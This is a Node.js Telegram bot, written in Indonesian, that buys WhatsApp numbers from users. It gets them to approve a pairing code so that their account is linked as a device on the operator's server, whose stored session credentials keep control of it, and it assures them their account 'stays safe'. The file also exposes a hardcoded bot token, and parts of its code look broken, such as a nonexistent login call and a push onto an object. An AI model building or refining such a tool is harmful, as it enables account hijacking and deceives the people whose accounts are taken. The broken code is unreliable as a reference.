// ==============================================
// 🤖 WS SELL XCRL • LOGIN VIA WS CODE
// ==============================================

const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { Bot, InlineKeyboard } = require('grammy');
const express = require('express');
const fs = require('fs');
const path = require('path');

// ------------------- KONFIGURASI -------------------
const BOT_TOKEN = '8611704774:AAGgwMWUJvimvfej5VCWoRlm87CyJocZbTQ';
const ADMIN_ID = 8783239765;
const PORT = process.env.PORT || 8080;

let PENGATURAN = {
  REWARD: 5000,
  MIN_WD: 10000,
  STATUS_TOKO: "🟢 TOKO SEDANG BUKA",
  INFO_WA: "📞 Bantuan: Hubungi Admin",
  PESAN_TUTUP: "❌ Toko sedang tutup sementara"
};

let WD_METHODS = {
  dana: '08xxxx a.n Pemilik',
  ovo: '08xxxx a.n Pemilik',
  shopeepay: '08xxxx a.n Pemilik',
  bca: '12345678 a.n Pemilik'
};
// ---------------------------------------------------

// Buat folder penyimpanan sesi jika belum ada
if (!fs.existsSync('./auth')) fs.mkdirSync('./auth', { recursive: true });

// Penjaga agar bot tetap hidup 24 jam
const app = express();
app.get('/', (_, res) => res.send('✅ WS SELL XCRL Aktif 24 Jam | WA Tetap Bisa Diakses'));
app.listen(PORT, () => console.log('🌐 Penjaga nyala berjalan di port', PORT));

const bot = new Bot(BOT_TOKEN);
const prosesPengguna = new Map(); // Menyimpan proses verifikasi per user
let data = { saldo: {}, transaksi: [], wd: {} };

// Muat dan simpan data otomatis
if (fs.existsSync('./data.json')) {
  try {
    const muat = JSON.parse(fs.readFileSync('./data.json'));
    data = muat.data || data;
    PENGATURAN = muat.pengaturan || PENGATURAN;
    WD_METHODS = muat.wd || WD_METHODS;
  } catch (e) {}
}
function simpanSemua() {
  fs.writeFileSync('./data.json', JSON.stringify({ data, pengaturan: PENGATURAN, wd: WD_METHODS }, null, 2));
}

// ==================== MENU UTAMA ====================
async function menuPengguna(ctx) {
  const saldo = data.saldo[ctx.from.id] || 0;
  const teks = `
🏪 *${PENGATURAN.STATUS_TOKO}*
💰 Harga per nomor: *Rp${PENGATURAN.REWARD.toLocaleString('id-ID')}*
💵 Saldo kamu: *Rp${saldo.toLocaleString('id-ID')}*
💳 Minimal penarikan: *Rp${PENGATURAN.MIN_WD.toLocaleString('id-ID')}*

${PENGATURAN.INFO_WA}
  `;
  const tombol = new InlineKeyboard()
    .text('📤 JUAL NOMOR', 'jual_nomor').row()
    .text('💰 CEK SALDO', 'cek_saldo').row()
    .text('💳 TARIK SALDO', 'menu_wd').row()
    .text('📖 CARA PAKAI', 'cara_pakai');
  await ctx.reply(`👋 *WS SELL XCRL* 🚀\n${teks}`, { reply_markup: tombol, parse_mode: 'Markdown' });
}

async function menuAdmin(ctx) {
  const tombol = new InlineKeyboard()
    .text('💰 UBAH RATE', 'ubah_rate').row()
    .text('🏪 ATUR STATUS TOKO', 'atur_status').row()
    .text('📞 UBAH INFO', 'ubah_info').row()
    .text('💳 ATUR METODE WD', 'atur_wd').row()
    .text('👤 DAFTAR PENGGUNA', 'lihat_user').row()
    .text('📋 RIWAYAT TRANSAKSI', 'riwayat');
  await ctx.reply(`⚙️ *PANEL ADMIN*\n💰 Rate: Rp${PENGATURAN.REWARD.toLocaleString('id-ID')}\n🏪 Status: ${PENGATURAN.STATUS_TOKO}`, { reply_markup: tombol, parse_mode: 'Markdown' });
}

// ==================== PROSES UTAMA ====================
bot.on('message:text', async ctx => {
  const uid = ctx.from.id;
  const teks = ctx.message.text.trim();

  // Perintah khusus Admin
  if (uid === ADMIN_ID) {
    if (teks.startsWith('rate ')) {
      const nilai = parseInt(teks.split(' ')[1]);
      if (nilai > 0) {
        PENGATURAN.REWARD = nilai;
        simpanSemua();
        return ctx.reply(`✅ Rate berhasil diubah menjadi *Rp${nilai.toLocaleString('id-ID')}*`, { parse_mode: 'Markdown' });
      }
    }
    if (teks.startsWith('info ')) {
      PENGATURAN.INFO_WA = teks.slice(5).trim();
      simpanSemua();
      return ctx.reply(`✅ Info berhasil diperbarui!`);
    }
    if (teks.startsWith('wd ')) {
      const [_, metode, ...detail] = teks.split(' ');
      if (metode && detail.length > 0) {
        WD_METHODS[metode.toLowerCase()] = detail.join(' ');
        simpanSemua();
        return ctx.reply(`✅ Metode *${metode.toUpperCase()}* berhasil disimpan!`);
      }
    }
  }

  // Cek jika toko sedang tutup
  if (PENGATURAN.STATUS_TOKO.includes('🔴 TUTUP') && uid !== ADMIN_ID) {
    return ctx.reply(PENGATURAN.PESAN_TUTUP);
  }

  // 🟡 LANGKAH 1: Pengguna kirim nomor
  if (/^\+?\d{10,15}$/.test(teks)) {
    const nomor = teks.replace('+', '');
    await ctx.reply('⏳ Sedang memproses, mohon tunggu sebentar...');

    try {
      const { state, saveCreds } = await useMultiFileAuthState(`./auth/${uid}_${nomor}`);
      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        browser: ['WhatsApp', 'Android', '2.24.10.5'],
        syncFullHistory: false
      });

      sock.ev.on('creds.update', saveCreds);

      sock.ev.on('connection.update', async ({ connection }) => {
        if (connection === 'open') {
          // Meminta kode verifikasi lewat nomor
          const kode = await sock.requestPairingCode(nomor);
          prosesPengguna.set(uid, { sock, nomor });

          await ctx.reply(`✅ *NOMOR DITERIMA!* 📲

📝 CARA VERIFIKASI:
1. Buka aplikasi WhatsApp di HP kamu
2. Masukkan nomor: *+${nomor}*
3. Pilih opsi: *Verifikasi lewat nomor telepon*
4. Masukkan kode berikut:

🔑 *${kode}*

👉 *Kirim kode ini kembali ke bot* untuk menyelesaikan proses
✅ *WA kamu tetap bisa dibuka dan dipakai seperti biasa*`, { parse_mode: 'Markdown' });
        }
      });

    } catch (err) {
      prosesPengguna.delete(uid);
      return ctx.reply('❌ Gagal memproses! Pastikan nomor valid dan coba lagi.');
    }
    return;
  }

  // 🟢 LANGKAH 2: Pengguna kirim kode WS → Otomatis terhubung
  if (prosesPengguna.has(uid)) {
    const { sock, nomor } = prosesPengguna.get(uid);
    const kodeBersih = teks.replace(/\s|-/g, '');

    try {
      await sock.login(kodeBersih);

      // Tambah saldo otomatis
      data.saldo[uid] = (data.saldo[uid] || 0) + PENGATURAN.REWARD;
      const catatan = `[${new Date().toLocaleString('id-ID')}] | +${nomor} | +Rp${PENGATURAN.REWARD.toLocaleString('id-ID')}`;
      data.transaksi.push(catatan);
      simpanSemua();

      await ctx.reply(`🎉 *BERHASIL TERHUBUNG!* ✅

📞 Nomor: +${nomor}
🔐 Status: *Terverifikasi & Aktif*
💰 Pendapatan: *Rp${PENGATURAN.REWARD.toLocaleString('id-ID')}*
💵 Saldo Baru: *Rp${data.saldo[uid].toLocaleString('id-ID')}*

✅ *WA kamu tetap aman dan bisa dibuka kapan saja*
✅ Semua proses selesai otomatis`, { parse_mode: 'Markdown' });

      // Notifikasi ke Admin
      await bot.api.sendMessage(ADMIN_ID, `📥 *TRANSAKSI BERHASIL*
👤 Pengguna ID: ${uid}
📞 Nomor: +${nomor}
💵 Masuk: Rp${PENGATURAN.REWARD.toLocaleString('id-ID')}`, { parse_mode: 'Markdown' });

    } catch (err) {
      await ctx.reply('❌ Kode salah, kadaluarsa, atau tidak valid!\nSilakan ulangi proses jual nomor lagi.');
    }
    prosesPengguna.delete(uid);
    return;
  }
});

// ==================== TOMBOL & PERINTAH ====================
bot.callbackQuery('jual_nomor', async ctx => {
  await ctx.answerCallbackQuery();
  await ctx.reply('📤 Silakan kirim nomor WhatsApp kamu dengan format:\nContoh: *+628123456789*', { parse_mode: 'Markdown' });
});

bot.callbackQuery('cek_saldo', async ctx => {
  await ctx.answerCallbackQuery();
  const saldo = data.saldo[ctx.from.id] || 0;
  await ctx.reply(`💵 *Saldo Kamu Saat Ini:*\nRp${saldo.toLocaleString('id-ID')}`, { parse_mode: 'Markdown' });
});

bot.callbackQuery('cara_pakai', async ctx => {
  await ctx.answerCallbackQuery();
  await ctx.reply(`📖 *Cara Menggunakan WS SELL XCRL* 📱

1. Pilih menu 📤 *JUAL NOMOR*
2. Kirim nomor WhatsApp kamu
3. Ikuti petunjuk, masukkan kode verifikasi di WA kamu
4. Kirim kode tersebut kembali ke bot
✅ Selesai! Saldo otomatis masuk, WA tetap bisa dipakai

💰 Rate: Rp${PENGATURAN.REWARD.toLocaleString('id-ID')}
💳 Minimal WD: Rp${PENGATURAN.MIN_WD.toLocaleString('id-ID')}`, { parse_mode: 'Markdown' });
});

bot.callbackQuery('menu_wd', async ctx => {
  await ctx.answerCallbackQuery();
  const saldo = data.saldo[ctx.from.id] || 0;
  if (saldo < PENGATURAN.MIN_WD) {
    return ctx.reply(`❌ *Saldo Belum Cukup*\nMinimal penarikan: *Rp${PENGATURAN.MIN_WD.toLocaleString('id-ID')}*\nSaldo kamu: *Rp${saldo.toLocaleString('id-ID')}*`, { parse_mode: 'Markdown' });
  }
  const daftarMetode = Object.entries(WD_METHODS).map(([m, r]) => `• ${m.toUpperCase()}: ${r}`).join('\n');
  await ctx.reply(`💳 *Cara Tarik Saldo* 💸

Gunakan format:
*/wd <metode> <jumlah>*

Contoh:
/wd dana 25000

Metode tersedia:
${daftarMetode}`, { parse_mode: 'Markdown' });
});

bot.callbackQuery('ubah_rate', ctx => {
  ctx.answerCallbackQuery();
  ctx.reply('✏️ *Ubah Harga per Nomor*\nContoh: *rate 7500*', { parse_mode: 'Markdown' });
});

bot.callbackQuery('atur_status', ctx => {
  ctx.answerCallbackQuery();
  const tombolStatus = new InlineKeyboard()
    .text('🟢 BUKA TOKO', 'set_buka').row()
    .text('🔴 TUTUP TOKO', 'set_tutup');
  ctx.reply('🏪 *Pilih Status Toko:*', { reply_markup: tombolStatus, parse_mode: 'Markdown' });
});

bot.callbackQuery('set_buka', ctx => {
  ctx.answerCallbackQuery();
  PENGATURAN.STATUS_TOKO = "🟢 TOKO SEDANG BUKA";
  simpanSemua();
  ctx.reply('✅ Toko berhasil dibuka kembali!');
});

bot.callbackQuery('set_tutup', ctx => {
  ctx.answerCallbackQuery();
  PENGATURAN.STATUS_TOKO = "🔴 TOKO SEDANG TUTUP";
  simpanSemua();
  ctx.reply('✅ Toko berhasil ditutup sementara!');
});

bot.callbackQuery('ubah_info', ctx => {
  ctx.answerCallbackQuery();
  ctx.reply('✏️ *Ubah Info / Kontak*\nContoh: *info 📞 Bantuan: +628xxxxxxx*', { parse_mode: 'Markdown' });
});

bot.callbackQuery('atur_wd', ctx => {
  ctx.answerCallbackQuery();
  ctx.reply('✏️ *Atur Rekening Tujuan*\nContoh: *wd dana 0812xxxxxxx a.n Nama*', { parse_mode: 'Markdown' });
});

bot.callbackQuery('lihat_user', ctx => {
  ctx.answerCallbackQuery();
  const daftar = Object.entries(data.saldo).map(([id, s]) => `👤 ID: ${id} | Rp${s.toLocaleString('id-ID')}`).join('\n') || 'Belum ada pengguna';
  ctx.reply(`📋 *Daftar Pengguna & Saldo:*\n${daftar}`);
});

bot.callbackQuery('riwayat', ctx => {
  ctx.answerCallbackQuery();
  const log = data.transaksi.slice(-20).join('\n') || 'Belum ada riwayat transaksi';
  ctx.reply(`📜 *Riwayat Transaksi Terakhir:*\n${log}`);
});

// Perintah Tarik Saldo
bot.command('wd', async ctx => {
  const uid = ctx.from.id;
  const args = ctx.message.text.trim().split(' ');
  const metode = args[1]?.toLowerCase();
  const jumlah = parseInt(args[2]);

  if (!metode || !jumlah || jumlah < PENGATURAN.MIN_WD || !WD_METHODS[metode] || (data.saldo[uid] || 0) < jumlah) {
    return ctx.reply('❌ Format salah, saldo tidak cukup, atau metode tidak tersedia!', { parse_mode: 'Markdown' });
  }

  data.saldo[uid] -= jumlah;
  const catatanWD = `[${new Date().toLocaleString('id-ID')}] | User: ${uid} | WD: Rp${jumlah.toLocaleString('id-ID')} ke ${metode.toUpperCase()}`;
  data.wd.push(catatanWD);
  simpanSemua();

  await ctx.reply(`✅ *Permintaan Penarikan Diterima!* 💸
💳 Metode: ${metode.toUpperCase()}
💵 Jumlah: Rp${jumlah.toLocaleString('id-ID')}
🏦 Tujuan: ${WD_METHODS[metode]}

⏳ Proses maksimal 1x24 jam kerja`, { parse_mode: 'Markdown' });

  await bot.api.sendMessage(ADMIN_ID, `📤 *PERMINTAAN PENARIKAN*
👤 User: ${uid}
💳 Metode: ${metode.toUpperCase()}
💵 Jumlah: Rp${jumlah.toLocaleString('id-ID')}
🏦 Tujuan: ${WD_METHODS[metode]}`, { parse_mode: 'Markdown' });
});

// Perintah Dasar
bot.command('start', async ctx => {
  const uid = ctx.from.id;
  if (!data.saldo[uid]) data.saldo[uid] = 0;
  return uid === ADMIN_ID ? menuAdmin(ctx) : menuPengguna(ctx);
});

bot.start();
console.log('🤖 WS SELL XCRL • Berjalan 24 Jam | WA Tetap Bisa Diakses');
     
